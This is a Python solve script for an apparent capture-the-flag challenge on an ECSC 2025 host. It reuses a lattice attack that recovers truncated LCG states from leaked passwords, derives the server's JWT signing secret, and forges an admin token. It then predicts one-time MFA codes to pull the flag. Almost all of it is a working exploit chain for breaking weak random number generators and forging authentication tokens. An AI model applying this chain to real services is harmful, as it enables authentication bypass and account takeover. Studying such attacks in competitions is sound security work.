# https://github.com/jvdsn/crypto-attacks/blob/master/attacks/lcg/truncated_state_recovery.py

from sage.all import QQ
from sage.all import ZZ
from sage.all import matrix
from sage.all import vector


def attack(y, k, s, m, a, c):
    """
    Recovers the states associated with the outputs from a truncated linear congruential generator.
    More information: Frieze, A. et al., "Reconstructing Truncated Integer Variables Satisfying Linear Congruences"
    :param y: the sequential output values obtained from the truncated LCG (the states truncated to s most significant bits)
    :param k: the bit length of the states
    :param s: the bit length of the outputs
    :param m: the modulus of the LCG
    :param a: the multiplier of the LCG
    :param c: the increment of the LCG
    :return: a list containing the states associated with the provided outputs
    """
    diff_bit_length = k - s

    # Preparing for the lattice reduction.
    delta = c % m
    y = vector(ZZ, y)
    for i in range(len(y)):
        # Shift output value to the MSBs and remove the increment.
        y[i] = (y[i] << diff_bit_length) - delta
        delta = (a * delta + c) % m

    # This lattice only works for increment = 0.
    B = matrix(ZZ, len(y), len(y))
    B[0, 0] = m
    for i in range(1, len(y)):
        B[i, 0] = a**i
        B[i, i] = -1

    B = B.LLL()

    # Finding the target value to solve the equation for the states.
    b = B * y
    for i in range(len(b)):
        b[i] = round(QQ(b[i]) / m) * m - b[i]

    # Recovering the states
    delta = c % m
    x = list(B.solve_right(b))
    for i, state in enumerate(x):
        # Adding the MSBs and the increment back again.
        x[i] = int(y[i] + state + delta)
        delta = (a * delta + c) % m

    return x


class LCG:
    def __init__(self, bit_count: int, current: int | None = None):
        import random

        p = 237265950040262713941897142843147616729
        a = 233399005916624306523442005425011133900
        random.seed(1)
        self.a = a
        self.p = p
        if current:
            self.current = current
        else:
            self.current = random.randint(p // 2, p)
        print(f"Starting seed: {self.current}")

    def _next(self):
        self.current = self.a * self.current % self.p
        print(self.current)
        return self.current

    def getrandbits(self, bit_count: int) -> int:
        result_bits = []
        while len(result_bits) < bit_count:
            val = self._next()
            # print(val)
            bits = bin(val)[2:].zfill(self.p.bit_length())
            result_bits.extend(bits)

        result_bits = result_bits[:bit_count]
        bitstring = "".join(result_bits)
        # print(int(bitstring, 2))
        return int(bitstring, 2)


import base64
from flask_jwt_extended import JWTManager, create_access_token
from flask import Flask
import requests

s = requests.Session()
# HOST = "http://localhost:5001"
HOST = "https://levelledmfa.ecsc25.hack.cert.pl/"

random_passwords = []
token = ""
for _ in range(64):
    resp = s.get(
        HOST + "/generate",
        headers={"Authorization": "Bearer " + token if token else None},
    ).json()

    print(f'"{resp["password"]}", ')
    random_passwords.append(resp["password"])
    token = resp["token"]

print("passwords", random_passwords)

a = 233399005916624306523442005425011133900
c = 0
m = 237265950040262713941897142843147616729


def att(outs):
    return attack(outs, 128, 64, m, a, c)


states_from_passwords = att(
    [int.from_bytes(base64.b64decode(x), "big") for x in random_passwords]
)
print(states_from_passwords)


def modinv(a, m):
    # Modular inverse using extended Euclidean algorithm
    # Returns a^{-1} mod m
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise Exception("No modular inverse")
    return x % m


def extended_gcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = extended_gcd(b % a, a)
        return (g, x - (b // a) * y, y)


def lcg_prev(x_n, a, c, m):
    a_inv = modinv(a, m)
    return (a_inv * (x_n - c)) % m


x_n = states_from_passwords[0]  # current state
x_prev = lcg_prev(x_n, a, c, m)
print(x_prev)

states_from_passwords = att(
    [x_prev >> 64]
    + [int.from_bytes(base64.b64decode(x), "big") for x in random_passwords]
)
print(states_from_passwords)

x_n = states_from_passwords[0]  # current state
x_prev_2 = lcg_prev(x_n, a, c, m)
print(x_prev_2)

secret = ((x_prev_2 << 128) + x_prev).to_bytes(32, "big")
print("jwt", secret)


app = Flask(__name__)
app.config["JWT_SECRET_KEY"] = secret
jwt = JWTManager(app)
with app.test_request_context("/asdf"):
    jwt = create_access_token(identity="admin", additional_claims={"current": 1})

otp = s.post(
    HOST + "/flag",
    headers={
        "Authorization": "Bearer " + token,
    },
).text.split(" ")[-1]

r = LCG(128, states_from_passwords[-1])


def get_random_string(length):
    return r.getrandbits(length * 8).to_bytes(length, "big")


def get_mfa():
    return get_random_string(8)


print("leaked otp:", otp[:-5])

while get_mfa() != base64.b64decode(otp[:-5]):
    continue

for _ in range(200):
    pred_token = base64.b64encode(get_mfa()).decode()
    print("testing token", pred_token)

    resp = s.post(
        HOST + "/flag",
        headers={"Authorization": "Bearer " + jwt},
        json={"OTP": pred_token},
    ).text
    print(resp)
    if "ecsc25" in resp:
        break
